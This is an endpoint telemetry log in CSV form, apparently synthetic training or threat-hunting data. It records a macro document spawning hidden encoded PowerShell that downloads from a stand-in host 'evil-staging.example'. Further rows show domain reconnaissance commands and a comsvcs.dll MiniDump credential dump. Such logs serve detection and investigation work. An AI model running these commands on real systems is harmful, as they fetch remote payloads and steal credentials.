Timestamp,DeviceName,ActionType,FileName,FolderPath,ProcessCommandLine,SHA256,AccountName,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessId,InitiatingProcessAccountName,ProcessId,RemoteIP,RemoteUrl,RemotePort,ReportId
2026-05-15T09:14:22Z,WS-FINANCE-04,ProcessCreated,svchost.exe,C:\Windows\System32,svchost.exe -k netsvcs,A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2,SYSTEM,services.exe,C:\Windows\System32\services.exe,612,SYSTEM,4128,,,,1001
2026-05-15T09:18:03Z,WS-FINANCE-04,ProcessCreated,chrome.exe,C:\Program Files\Google\Chrome\Application,"chrome.exe --type=renderer",F1E2D3C4B5A6F1E2D3C4B5A6F1E2D3C4B5A6F1E2D3C4B5A6F1E2D3C4B5A6F1E2,jdoe,explorer.exe,C:\Windows\explorer.exe,3412,jdoe,7218,,,,1002
2026-05-15T09:32:11Z,WS-FINANCE-04,ProcessCreated,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16,"WINWORD.EXE /n ""C:\Users\jdoe\Downloads\Invoice_Q2.docm""",B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8,jdoe,explorer.exe,C:\Windows\explorer.exe,3412,jdoe,8044,,,,1003
2026-05-15T09:32:47Z,WS-FINANCE-04,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,"powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQAyAC4AMQAyADUALjE4AC4ANAA0AC8AcwAyAA==",C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jdoe,WINWORD.EXE,"WINWORD.EXE /n ""C:\Users\jdoe\Downloads\Invoice_Q2.docm""",8044,jdoe,9112,,,,1004
2026-05-15T09:33:02Z,WS-FINANCE-04,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,"powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQAyAC4AMQAyADUALjE4AC4ANAA0AC8AcwAyAA==",C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jdoe,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,9112,jdoe,9112,198.51.100.42,evil-staging.example,443,1005
2026-05-15T09:33:18Z,WS-FINANCE-04,FileCreated,s2.ps1,C:\Users\jdoe\AppData\Local\Temp,"powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0",D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2,jdoe,powershell.exe,"powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0",9112,jdoe,9112,,,,1006
2026-05-15T09:34:55Z,WS-FINANCE-04,ProcessCreated,cmd.exe,C:\Windows\System32,"cmd.exe /c whoami /all",E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4,jdoe,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,9112,jdoe,10221,,,,1007
2026-05-15T09:35:08Z,WS-FINANCE-04,ProcessCreated,nltest.exe,C:\Windows\System32,nltest.exe /domain_trusts,F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6,jdoe,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,9112,jdoe,10412,,,,1008
2026-05-15T09:35:21Z,WS-FINANCE-04,ProcessCreated,net.exe,C:\Windows\System32,net.exe group "Domain Admins" /domain,A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8,jdoe,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,9112,jdoe,10518,,,,1009
2026-05-15T09:37:44Z,WS-FINANCE-04,ProcessCreated,rundll32.exe,C:\Windows\System32,"rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 716 C:\Users\jdoe\AppData\Local\Temp\out.bin full",B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0,jdoe,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,9112,jdoe,11003,,,,1010
